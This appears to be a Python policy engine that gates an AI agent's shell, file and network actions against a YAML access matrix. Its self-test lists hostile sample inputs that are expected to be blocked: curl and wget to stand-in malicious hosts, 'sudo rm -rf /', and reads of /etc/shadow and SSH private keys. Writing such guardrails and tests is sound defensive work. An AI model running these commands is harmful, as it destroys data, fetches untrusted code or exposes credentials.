"""
Policy Engine — The Access-Matrix Evaluator
=============================================
This module loads a YAML policy file and evaluates agent actions against it.

How it maps to classical OS security theory:
  - The YAML file IS the access matrix (Lampson, 1971)
  - Rows = the AI agent (subject)
  - Columns = system resources: files, commands, network (objects)
  - Cells = ALLOW, BLOCK, or FLAG (permissions)

The engine checks every action the agent wants to take BEFORE it executes.
If the action is blocked, it never reaches the OS kernel.

Key concepts:
  - Glob matching: '/tmp/*' means 'any path starting with /tmp/'
  - First-match wins: rules are checked in order, first match determines the decision
  - Default action: if no rule matches, the default_action from the policy applies
  - Logging: every decision is written to logs/guardrails.jsonl for the dashboard
"""

import os
import sys
import json
import hashlib
import fnmatch
import datetime

import yaml

from src.policy_engine.shell_split import parse_shell, ShellParseError

# Project root for resolving relative paths
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))

# Where policy decisions are logged (read by the dashboard)
LOG_FILE = os.path.join(PROJECT_ROOT, 'logs', 'guardrails.jsonl')

# Default policy file path
DEFAULT_POLICY = os.path.join(os.path.dirname(__file__), 'policies', 'default_policy.yaml')


class PolicyEngine:
    """Evaluates agent actions against the access-matrix policy.
    
    Usage:
        engine = PolicyEngine()  # loads default policy
        decision = engine.check('read_file', '/etc/shadow')  # returns 'BLOCK'
        decision = engine.check('run_shell', 'ls /tmp')       # returns 'ALLOW'
    """

    def __init__(self, policy_path: str = None, log_file: str = None, verbose: bool = True):
        """Load the policy YAML file.
        
        Args:
            policy_path: Path to a YAML policy file. Uses default if None.
            log_file: Decision log (JSON Lines). Defaults to logs/guardrails.jsonl,
                      which the dashboard reads; the benchmark uses its own.
            verbose: Print a summary when the policy is loaded.
        """
        policy_path = policy_path or DEFAULT_POLICY
        
        if not os.path.exists(policy_path):
            print(f"ERROR: Policy file not found: {policy_path}")
            sys.exit(1)
        
        # Read the bytes once: the hash identifies exactly which policy produced a result
        with open(policy_path, 'rb') as f:
            raw = f.read()
        self.policy_path = os.path.abspath(policy_path)
        self.policy_sha256 = hashlib.sha256(raw).hexdigest()
        self.policy = yaml.safe_load(raw.decode('utf-8'))
        
        self.default_action = self.policy.get('default_action', 'FLAG')
        
        # Ensure the log directory exists
        self.log_file = log_file
        os.makedirs(os.path.dirname(self._log_path()), exist_ok=True)

        if verbose:
            print(f"[POLICY ENGINE] Loaded policy from: {os.path.basename(policy_path)}")
            print(f"[POLICY ENGINE] Default action: {self.default_action}")

    def _log_path(self) -> str:
        # Resolved at call time so tests can redirect the module-level default
        return self.log_file or LOG_FILE

    def check(self, action_type: str, target: str) -> str:
        """Check if an action is allowed by the policy.
        
        Args:
            action_type: Type of action ('run_shell', 'read_file', 'write_file', 
                         'http_request', 'respond')
            target: The target of the action (command string, file path, or URL)
        
        Returns:
            'ALLOW', 'BLOCK', or 'FLAG'
        """
        return self.check_detailed(action_type, target)[0]

    def check_detailed(self, action_type: str, target: str) -> tuple:
        """Like check(), but returns (decision, reason) so the agent can be told why."""
        decision = self.default_action
        reason = "No matching rule (default action applied)"

        if action_type == "respond":
            # Text-only responses are always allowed (no system interaction)
            decision = "ALLOW"
            reason = "Text responses are always allowed"

        elif action_type == "run_shell":
            decision, reason = self._check_shell_command(target)

        elif action_type == "read_file":
            decision, reason = self._check_filesystem(target, 'read')

        elif action_type == "write_file":
            decision, reason = self._check_filesystem(target, 'write')

        elif action_type == "http_request":
            decision, reason = self._check_network(target)

        # Log every decision for the dashboard
        self._log_decision(action_type, target, decision, reason)

        return decision, reason

    def _check_shell_command(self, command: str) -> tuple:
        """Check a shell command against process execution rules.

        The executor hands the whole string to /bin/sh, so the policy must see
        every simple command the shell would run, not just the first word.
        parse_shell() splits the string; each piece is checked on its own and
        the first BLOCK wins. Input that cannot be parsed is refused.
        """
        try:
            commands = parse_shell(command)
        except ShellParseError as e:
            return ('BLOCK', f"Unparseable shell command (fail closed): {e}")

        if not commands:
            return (self.default_action, "Command '' has no matching rule")

        results = [(cmd, self._check_simple_command(cmd)) for cmd in commands]

        for cmd, (decision, reason) in results:
            if decision == 'BLOCK':
                if len(commands) == 1:
                    return ('BLOCK', reason)
                return ('BLOCK', f"Sub-command '{cmd.text}' blocked: {reason}")

        for cmd, (decision, reason) in results:
            if decision != 'ALLOW':
                if len(commands) == 1:
                    return (decision, reason)
                return (decision, f"Sub-command '{cmd.text}': {reason}")

        if len(commands) == 1:
            return results[0][1]
        return ('ALLOW', f"All {len(commands)} sub-commands are in the allow list")

    def _check_simple_command(self, cmd) -> tuple:
        """Check one simple command (already split out of any chain)."""
        process_rules = self.policy.get('process', {})
        argv = cmd.argv

        # Redirection targets are file accesses the shell makes on the command's behalf
        for target in cmd.writes:
            if target.startswith('/'):
                decision, reason = self._check_filesystem(target, 'write')
                if decision == 'BLOCK':
                    return ('BLOCK', f"Redirect to '{target}' is blocked: {reason}")
        for target in cmd.reads:
            if target.startswith('/'):
                decision, reason = self._check_filesystem(target, 'read')
                if decision == 'BLOCK':
                    return ('BLOCK', f"Redirect from '{target}' is blocked: {reason}")

        if not argv:
            return ('ALLOW', 'No command to run')

        base_cmd = os.path.basename(argv[0])
        full = ' '.join(argv)

        # Check block list first (security: deny takes priority)
        for blocked in process_rules.get('block', []):
            if base_cmd == blocked or full.startswith(blocked):
                return ('BLOCK', f"Command '{base_cmd}' is in the block list")

        # Check allow list
        for allowed in process_rules.get('allow', []):
            if base_cmd == allowed:
                # Additionally check if the command targets a blocked file
                fs_decision, fs_reason = self._check_command_file_args(argv)
                if fs_decision == 'BLOCK':
                    return ('BLOCK', fs_reason)
                return ('ALLOW', f"Command '{base_cmd}' is in the allow list")

        return (self.default_action, f"Command '{base_cmd}' has no matching rule")

    def _check_command_file_args(self, tokens: list) -> tuple:
        """Check if a shell command's file arguments are allowed.
        
        e.g., 'cat /etc/shadow' — 'cat' is allowed but '/etc/shadow' is blocked.
        """
        if len(tokens) <= 1:
            return ('ALLOW', 'No file arguments')
        
        for arg in tokens[1:]:
            if arg.startswith('-'):
                continue  # Skip flags like -l, -a, --help
            if arg.startswith('/'):
                # This looks like a file path — check filesystem rules
                decision, reason = self._check_filesystem(arg, 'read')
                if decision == 'BLOCK':
                    return ('BLOCK', f"File argument '{arg}' is blocked: {reason}")
        
        return ('ALLOW', 'File arguments are allowed')

    def _check_filesystem(self, path: str, operation: str) -> tuple:
        """Check a file path against filesystem access rules.
        
        Uses glob-style matching: '/tmp/*' matches '/tmp/foo.txt'
        """
        fs_rules = self.policy.get('filesystem', {})
        op_rules = fs_rules.get(operation, {})

        # Normalize the path
        path = os.path.normpath(path)

        # Check block list first
        for pattern in op_rules.get('block', []):
            if fnmatch.fnmatch(path, pattern):
                return ('BLOCK', f"Path '{path}' matches block rule: {pattern}")

        # Check allow list
        for pattern in op_rules.get('allow', []):
            if fnmatch.fnmatch(path, pattern):
                return ('ALLOW', f"Path '{path}' matches allow rule: {pattern}")

        return (self.default_action, f"Path '{path}' has no matching rule")

    def _check_network(self, url: str) -> tuple:
        """Check a URL/network target against network access rules."""
        net_rules = self.policy.get('network', {})

        # Check block list
        for pattern in net_rules.get('block', []):
            if pattern == '*' or fnmatch.fnmatch(url, pattern):
                return ('BLOCK', f"Network access blocked (matches: {pattern})")

        # Check allow list
        for pattern in net_rules.get('allow', []):
            if fnmatch.fnmatch(url, pattern):
                return ('ALLOW', f"URL matches allow rule: {pattern}")

        return (self.default_action, f"URL '{url}' has no matching rule")

    def record_decision(self, action_type: str, target, decision: str, reason: str):
        """Log a decision made outside check_detailed (e.g. an action refused before it
        could be evaluated), in the same format the dashboard reads."""
        self._log_decision(action_type, target if isinstance(target, str) else repr(target),
                           decision, reason)

    def _log_decision(self, action_type: str, target: str, decision: str, reason: str, layer: str = "policy_engine"):
        """Write a decision to the JSON Lines log file.
        
        Format: one JSON object per line, read by the dashboard.
        """
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "action": action_type,
            "target": target,
            "decision": decision,
            "reason": reason,
            "layer": layer
        }
        
        try:
            with open(self._log_path(), 'a') as f:
                f.write(json.dumps(entry) + '\n')
        except Exception as e:
            print(f"  Warning: Could not write to log file: {e}")

    def get_policy_summary(self) -> str:
        """Return a human-readable summary of the loaded policy."""
        fs = self.policy.get('filesystem', {})
        proc = self.policy.get('process', {})
        net = self.policy.get('network', {})
        
        summary = []
        summary.append(f"Default action: {self.default_action}")
        summary.append(f"File read:  {len(fs.get('read', {}).get('allow', []))} allow, {len(fs.get('read', {}).get('block', []))} block rules")
        summary.append(f"File write: {len(fs.get('write', {}).get('allow', []))} allow, {len(fs.get('write', {}).get('block', []))} block rules")
        summary.append(f"Process:    {len(proc.get('allow', []))} allow, {len(proc.get('block', []))} block rules")
        summary.append(f"Network:    {len(net.get('allow', []))} allow, {len(net.get('block', []))} block rules")
        return '\n'.join(summary)


# ── Standalone test: run this file directly to verify the engine works ──
if __name__ == "__main__":
    print("\n" + "="*50)
    print("  Policy Engine — Standalone Test")
    print("="*50)
    
    engine = PolicyEngine()
    print(f"\nPolicy Summary:\n{engine.get_policy_summary()}")
    
    # Test cases — these should produce the expected results
    test_cases = [
        ("run_shell",    "ls /tmp",                        "ALLOW"),
        ("run_shell",    "cat /etc/shadow",                 "BLOCK"),
        ("run_shell",    "curl http://evil.com",            "BLOCK"),
        ("run_shell",    "sudo rm -rf /",                   "BLOCK"),
        ("run_shell",    "wget http://malware.com/bad.sh",  "BLOCK"),
        ("read_file",    "/tmp/test.txt",                   "ALLOW"),
        ("read_file",    "/etc/shadow",                     "BLOCK"),
        ("read_file",    "/home/user/.ssh/id_rsa",          "BLOCK"),
        ("write_file",   "/tmp/output.txt",                 "ALLOW"),
        ("write_file",   "/etc/crontab",                    "BLOCK"),
        ("http_request", "http://example.com",              "BLOCK"),
        ("respond",      "Hello, how can I help?",          "ALLOW"),
    ]
    
    print(f"\n{'Action':<15} {'Target':<40} {'Expected':<10} {'Got':<10} {'Status'}")
    print("-" * 95)
    
    passed = 0
    for action, target, expected in test_cases:
        result = engine.check(action, target)
        status = "✅" if result == expected else "❌"
        if result == expected:
            passed += 1
        print(f"{action:<15} {target:<40} {expected:<10} {result:<10} {status}")
    
    print(f"\nResults: {passed}/{len(test_cases)} passed")
